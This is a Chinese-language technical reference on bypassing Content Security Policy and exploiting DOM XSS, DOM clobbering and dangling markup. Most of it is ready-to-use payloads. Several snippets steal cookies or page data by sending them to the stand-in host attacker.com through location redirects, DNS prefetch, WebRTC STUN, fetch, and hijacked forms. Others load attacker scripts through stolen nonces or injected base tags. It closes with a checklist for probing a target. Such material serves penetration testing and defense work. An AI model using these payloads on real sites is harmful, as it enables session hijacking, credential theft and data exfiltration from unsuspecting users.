# CSP 绕过与 DOM XSS 深入技术

## CSP 基础架构

CSP 通过响应头或 meta 标签声明：

```
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com;
```

监控模式（不阻断，仅上报）使用 `Content-Security-Policy-Report-Only` 头。

### CSP 指令速查

| 指令 | 控制范围 |
|------|---------|
| `script-src` | JS 脚本加载与执行 |
| `default-src` | 未单独声明的指令的回退策略 |
| `base-uri` | `<base>` 标签可设置的 URL |
| `form-action` | 表单提交目标 |
| `frame-ancestors` | 谁可以嵌入当前页面 |
| `object-src` | `<object>` / `<embed>` / `<applet>` 来源 |
| `connect-src` | fetch / XHR / WebSocket 目标 |
| `worker-src` | Worker / SharedWorker / ServiceWorker 来源 |
| `navigate-to` | 页面可导航的目标 URL |

### Source 关键字（与绕过相关）

| 关键字 | 含义 |
|--------|------|
| `'unsafe-inline'` | 允许内联 script/style |
| `'unsafe-eval'` | 允许 eval() / Function() / setTimeout(string) |
| `'nonce-<value>'` | 仅允许匹配 nonce 的内联脚本 |
| `'sha256-<hash>'` | 仅允许匹配 hash 的脚本 |
| `'strict-dynamic'` | 已被 nonce/hash 信任的脚本创建的新脚本自动可信 |
| `data:` / `blob:` | 允许对应 URI scheme |

---

## 按指令分类的 CSP 绕过

### script-src 'unsafe-inline'

直接执行内联脚本，最简单的情况：

```html
"><script>alert(document.domain)</script>
```

#### unsafe-inline + self 的 iframe 组合

当 CSP 为 `script-src 'self' 'unsafe-inline'` 时，可通过 iframe srcdoc 绕过进一步限制：

```html
<iframe srcdoc="<script>alert(parent.document.cookie)</script>"></iframe>
```

### script-src 'unsafe-eval'

允许通过 eval 类函数执行字符串代码：

```javascript
eval("alert(document.domain)")
new Function("alert(document.domain)")()
setTimeout("alert(document.domain)", 0)
```

### script-src 'nonce-xxx'

#### Nonce 窃取与复用

若页面中有受限 JS 执行能力（如 Angular 表达式），可从 DOM 中读取已有 nonce 并创建新脚本：

```html
<img src="x" ng-on-error='
  doc=$event.target.ownerDocument;
  a=doc.defaultView.top.document.querySelector("[nonce]");
  b=doc.createElement("script");
  b.src="//attacker.com/evil.js";
  b.nonce=a.nonce;
  doc.body.appendChild(b)'>
```

#### Nonce + 缺失 base-uri

CSP 有 `script-src 'nonce-xxx'` 但缺少 `base-uri` 指令时，注入 `<base>` 标签使带 nonce 的相对路径脚本从攻击者服务器加载：

```html
<base href="https://attacker.com/">
<!-- 页面已有的 <script nonce="xxx" src="/app.js"> 会加载 attacker.com/app.js -->
```

### script-src 'strict-dynamic'

被 nonce/hash 信任的脚本创建的新 `<script>` 自动获得信任（忽略白名单域）。攻击思路：找到已信任脚本中的 gadget（模板注入、DOM 操作），借助它创建新 script 元素加载攻击者 JS。

### script-src 'self'

#### 文件上传绕过

上传一个 JS 内容的文件到同源（利用扩展名混淆）：

```html
<!-- 上传 .js 文件到同源路径 -->
"/><script src="/uploads/avatar.png.js"></script>

<!-- 利用 Apache 不识别的扩展名（如 .wave）绕过 MIME 检查 -->
"/><script src="/uploads/payload.wave"></script>
```

#### 同源 JSONP 端点

```html
<!-- 找到同源的 JSONP 接口 -->
<script src="/api/jsonp?callback=alert(1)//"></script>

<!-- WordPress JSONP -->
<script src="/wp-json/wp/v2/users/1?_jsonp=alert(1)"></script>
```

### script-src 白名单域绕过

#### Angular + CDN 库 / Google 服务

当 CSP 白名单包含 cdnjs.cloudflare.com 或 google.com 等域时：

```html
<!-- Angular + prototype.js 获取 window 对象 -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js"></script>
<div ng-app ng-csp>{{$on.curry.call().alert(1)}}</div>

<!-- Google reCAPTCHA 脚本 + Angular 表达式 -->
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)">
```

#### 第三方域滥用

CSP 白名单中若出现以下域，可注册对应服务上传攻击者控制的资源：

可执行 JS：`*.jsdelivr.com`、`*.cloudfront.net`、`*.amazonaws.com`、`*.azurewebsites.net`、`*.herokuapp.com`、`*.firebaseapp.com`

仅外泄数据：`www.facebook.com`（通过 fbq 跟踪像素）

### object-src 未限制

若 CSP 仅设置 `script-src 'self'` 但未设置 `object-src`：

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
```

### 缺失 form-action

若 CSP 无 `form-action` 指令（`default-src` 不覆盖 `form-action`），可劫持表单提交：

```html
<form action="https://attacker.com/steal">
  <!-- 后续的合法 form 标签会被忽略，数据提交到攻击者 -->
</form>
```

### 路径限制绕过（RPO + 重定向）

CSP 指定路径如 `script-src https://example.com/scripts/react/` 时：

**RPO**：利用 URL 编码路径遍历，浏览器视为路径下文件（符合 CSP），服务器解码后返回其他路径：

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

**重定向**：CSP 路径检查仅应用于初始 URL。通过一个允许域的 URL 302 重定向到任意路径，可绕过路径限制。

### CSP Policy 注入

若参数值被拼接进 CSP 头，注入 `;script-src-elem *` 或 `;script-src-elem 'unsafe-inline'` 覆盖 script-src。Edge 中注入 `;_` 即可使整个策略失效。

---

## CSP 数据外泄技术

当 CSP 严格限制 `script-src` 但其他指令宽松时的外泄方法：

### location 跳转

```javascript
document.location = "https://attacker.com/?" + document.cookie;
```

### DNS Prefetch 外泄

```javascript
var link = document.createElement('link');
link.rel = 'dns-prefetch';
link.href = '//' + document.cookie.split('=')[1] + '.attacker.com';
document.head.appendChild(link);
```

### WebRTC 外泄（不受 connect-src 限制）

```javascript
(async () => {
  let pc = new RTCPeerConnection({
    iceServers: [{ urls: "stun:" + data + ".attacker.com" }]
  });
  pc.createDataChannel("");
  pc.setLocalDescription(await pc.createOffer());
})();
```

### Report-Only 头外泄

若可控制 `Content-Security-Policy-Report-Only` 头（如通过 CRLF 注入），将报告 URI 指向攻击者。`<script>` 中的敏感内容因违反 CSP 而被上报到 `report-uri`。

### CSP + iframe 信息泄露

利用 `securitypolicyviolation` 事件捕获 `blockedURI`，推断重定向目标域名：

```javascript
document.addEventListener('securitypolicyviolation', e => {
  fetch('https://attacker.com/log?blocked=' + e.blockedURI);
});
```

---

## PHP 环境特殊绕过

**参数溢出**：发送超过 `max_input_vars`（默认 1000）个参数，PHP 启动 warning 导致后续 `header()` 失败（headers already sent），CSP 头不发出。

**响应缓冲区溢出**：PHP 默认 4096 字节缓冲区，用大量 warning 填满后 CSP 头不被发送。

---

## DOM XSS 深入分析

### Source 与 Sink 分类

**Source（按危险程度排序）：**

| 类别 | Source |
|------|--------|
| URL | `location.search` / `.hash` / `.href`, `document.URL`, `document.baseURI` |
| 跨窗口 | `window.name`（跨域保留）, `postMessage` |
| 存储 | `localStorage`, `sessionStorage`, `document.cookie` |
| 引用 | `document.referrer` |

**Sink（按危险等级排序）：**

| 等级 | Sink | 说明 |
|------|------|------|
| 最高危 | `eval()`, `Function()`, `setTimeout(str)`, `setInterval(str)` | 直接执行代码 |
| 高危 | `innerHTML`, `outerHTML`, `insertAdjacentHTML()`, `document.write()` | HTML 注入（innerHTML 不执行 `<script>` 但执行 `<img onerror>`） |
| 高危 | `$(userInput)`, `$.html()`, `$.parseHTML()`, `jQuery.globalEval()` | jQuery 特有 |
| 中危 | `location.href`, `location.assign()`, `window.open()`, `element.srcdoc` | URL 导航 |

### DOM XSS 审计方法

1. 搜索前端 JS 中所有 Sink 调用 → 2. 回溯参数来源是否用户可控 → 3. 检查中间过滤/编码

```javascript
// 典型易受攻击模式
var hash = location.hash.substring(1);
document.getElementById('output').innerHTML = hash;
// 利用: https://target.com/page#<img src=x onerror=alert(1)>
```

### window.name 跨域攻击

`window.name` 在跨域导航后仍然保留。攻击者可预设后让目标页面使用：

```html
<!-- 通过 iframe name 预设 -->
<iframe name="<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"
  src="https://target.com/page"></iframe>
```

若目标页面执行 `element.innerHTML = name`（隐式全局变量引用 `window.name`），即可触发 XSS。

### postMessage 消息验证缺陷

```javascript
// 易受攻击的监听器 - 无 origin 检查，直接写入 innerHTML
window.addEventListener('message', function(e) {
  document.getElementById('output').innerHTML = e.data;
});
```

攻击者通过 iframe 嵌入目标页面并发送恶意消息：

```html
<iframe src="https://target.com/page" id="f"></iframe>
<script>
  f.onload = () => f.contentWindow.postMessage('<img src=x onerror=alert(1)>', '*');
</script>
```

`data:` URI iframe 的 origin 为字符串 `"null"`，可绕过 `event.origin === "null"` 检查。

### 部分字段未过滤的存储型 DOM XSS

前端仅对部分字段做 DOMPurify 过滤，遗漏字段直接拼入 `innerHTML` 形成存储型 DOM XSS：

```javascript
card.innerHTML = `
  <div>${DOMPurify.sanitize(report.title)}</div>
  <div>${report.details}</div>  // 未过滤，可控 = 存储型 DOM XSS
`;
```

自动化机器人场景：Playwright 等预先在 localStorage 中设置 flag/token 后访问用户 URL，若目标页存在 DOM XSS 或允许 `javascript:` URI，可直接窃取预置数据。

---

## DOM Clobbering 进阶

### 覆盖 document 对象属性

HTML 规范允许 `embed`、`form`、`iframe`、`img`、`object` 的 `name` 属性覆盖 `document` 上的属性（如 `document.cookie`、`document.body`）：

```html
<img name=cookie>
<!-- typeof document.cookie 变为 'object'，不再是字符串 -->
```

### 过滤器/消毒器绕过

DOM Clobbering 可以覆盖 `.attributes`、`.nodeName`、`.tagName`、`.parentNode` 等 DOM 属性，使依赖这些属性遍历的过滤器失效：

```html
<form id="target">
  <input name="attributes">
</form>
<script>
  // 过滤器期望遍历 element.attributes
  // 但 target.attributes 现在返回 <input> 元素而非 NamedNodeMap
  let el = document.getElementById('target');
  console.log(el.attributes);  // HTMLInputElement, 不是属性列表
</script>
```

### DOMPurify cid: 协议技巧

DOMPurify 允许 `cid:` 协议且不对其中的双引号做 URL 编码。注入编码的双引号，运行时解码后逃逸属性值：

```html
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
```

`&quot;` 在运行时解码为 `"`，从 href 属性值中逃逸，创建 `onerror` 事件。

### 深层属性覆盖

```html
<!-- 两层：form + input -->
<form id="config"><input id="url" value="https://attacker.com"></form>
<!-- config.url.value === "https://attacker.com" -->

<!-- 更深层：嵌套 iframe + HTML 编码 -->
<iframe name="a" srcdoc="<iframe srcdoc='<a id=b href=controlled>' name=c>"></iframe>
<!-- 需等 iframe 渲染完成后访问 a.c.b -->
```

### 覆盖后写入的元素

利用 `<html>` 或 `<body>` 标签的 id 可覆盖先前声明的同 id 元素（在 SVG 中需 `<foreignobject>` 包裹）：

```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><foreignobject><html id="cdnDomain">clobbered</html></foreignobject></svg>
<script>
  document.getElementById('cdnDomain').innerText; // "clobbered"
</script>
```

### 表单劫持

通过 `form` 属性将外部元素注入到已有表单中：

```html
<!-- 向 id="login" 的表单注入隐藏字段和新提交按钮 -->
<textarea form="login" name="extra">stolen_data</textarea>
<button form="login" type="submit" formaction="https://attacker.com/steal" formmethod="post">
  Submit
</button>
```

---

## 悬挂标记与无脚本注入

当发现 HTML 注入但无法直接执行 JS（被 CSP 或过滤阻止）时的数据窃取技术。

### 未闭合标签窃取

注入未闭合的属性值，浏览器将后续 HTML 直到下一个匹配引号都当作属性内容发送：

```html
<img src='https://attacker.com/collect?data=
<!-- 若 img 被 CSP 阻止，替代方案 -->
<meta http-equiv="refresh" content="0;url=https://attacker.com/collect?data=
<style>@import//attacker.com?
<table background='https://attacker.com/collect?
```

### base + target 窃取（需用户交互）

注入未闭合的 `<base target='`，后续 HTML 成为 `window.name` 值，用户点击链接跳转后可在攻击者页面读取：

```javascript
if (window.name) {
  new Image().src = 'https://attacker.com/collect?' + encodeURIComponent(window.name);
}
```

### noscript 外泄（JS 禁用环境）

```html
<noscript><form action="https://attacker.com/collect">
<input type="submit" style="position:absolute;left:0;top:0;width:100%;height:100%">
<textarea name="content"></noscript>
```

### 表单覆盖窃取

```html
<form action="https://attacker.com/steal">
<!-- 原始 form 会被忽略 -->
<input type="hidden" name="stolen" value="
<!-- 后续直到下一个双引号的 HTML 成为 value -->
```

### iframe name 属性外泄

利用 iframe 自身嵌套和 name 属性泄露跨域数据：

```html
<iframe src="//target.com/page?injection=%22><iframe name=%27"
  onload="this.contentWindow[0].location='about:blank';
  setTimeout(()=>alert(this.contentWindow[0].name),500)"></iframe>
```

---

## Trusted Types 绕过

Trusted Types 要求向危险 Sink 传递的值必须经过 `trustedTypes.createPolicy()` 处理，通过 CSP 启用：`require-trusted-types-for 'script'; trusted-types <policy-name>`。

**绕过思路：**

1. **宽松 default 策略** — 若应用注册了直接返回输入的 default 策略，等于无防护
2. **策略实现漏洞** — 找到已允许策略名对应的过滤逻辑缺陷
3. **不受保护的 Sink** — `location.href = 'javascript:...'`、`window.open()` 不受 Trusted Types 限制
4. **Service Worker** — `importScripts()` 不受 CSP script-src 限制

---

## CSP 绕过检查清单

1. 获取 CSP 头：`curl -sI https://target/ | grep -i content-security-policy`
2. 在线分析：`https://csp-evaluator.withgoogle.com/`
3. 逐指令检查：script-src unsafe-inline/eval? 白名单域有 JSONP/Angular? 缺少 base-uri/form-action/object-src?
4. 检查同源：文件上传、JSONP 端点、Open Redirect
5. 非 JS 外泄：DNS Prefetch / WebRTC / 悬挂标记 / meta refresh / CSS import
